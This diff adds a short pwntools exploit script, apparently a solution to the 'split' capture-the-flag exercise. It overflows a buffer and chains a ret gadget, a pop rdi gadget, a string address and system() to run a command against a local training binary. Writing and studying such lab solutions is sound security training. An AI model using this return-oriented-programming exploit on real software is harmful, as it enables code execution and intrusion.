@@ -1,0 +1,20 @@
+from pwn import *
+
+p = process("./split")
+elf = ELF('./split')
+
+R = 0x00000000004007c3 #  pop rdi ; ret
+R2= 0x000000000040053e #  ret
+B = 0x601060           #  flag.txt 
+s = 0x400560           #  system
+
+
+payload  = 'A'*40
+payload += p64(R2)
+payload += p64(R)
+payload += p64(B)
+payload += p64(s)
+
+p.recvuntil('>')
+p.sendline(payload)
+print(p.recvall())
